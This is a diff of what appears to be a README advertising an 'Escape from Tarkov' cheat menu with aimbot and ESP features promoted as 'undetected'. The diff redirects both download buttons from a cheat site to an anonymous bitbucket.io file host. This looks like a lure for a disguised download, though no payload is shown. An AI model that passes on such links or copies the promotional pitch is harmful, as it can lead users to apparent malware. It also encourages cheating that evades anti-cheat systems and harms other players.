@@ -4,14 +4,14 @@ Let’s face it — *Escape from Tarkov* isn’t just hard... it’s punishing. 
 
 No need to run multiple sketchy tools — this cheat menu has **everything you need in one place**. Toggle, customize, dominate. Simple as that.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload13.bitbucket.io)
 ---
 
 ## 🧰 What’s Inside the Cheat Menu?
 
 This isn’t some one-trick aimbot. It’s a full-blown mod menu packed with features that make you unkillable and ultra-efficient in raids. Think of it as your PMC’s sixth sense – but on steroids. Every part of it is customizable, easy to control mid-game, and designed to stay **undetected**.
 
-[![Download Cheat](https://cheatseller.com/uploads/202304/phpdt9one_split_kern2.jpg)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Cheat](https://cheatseller.com/uploads/202304/phpdt9one_split_kern2.jpg)](https://fileoffload13.bitbucket.io)
 ---
 
 ## 🚀 Main Features at a Glance
@@ -111,3 +111,4 @@ Escape from Tarkov cheat menu, EFT aimbot menu, Tarkov ESP hack, Tarkov mod menu
 You’re already grinding hard in Tarkov – why not grind smart too? This cheat menu hands you full control of every raid, every map, every PvP encounter. Loot better, fight faster, survive longer. Whether you want a chill ESP-only vibe or full rage wipe runs — this menu does it all.
 
 Plug in, boot up, and own the raid. 🎯🧠💰
+
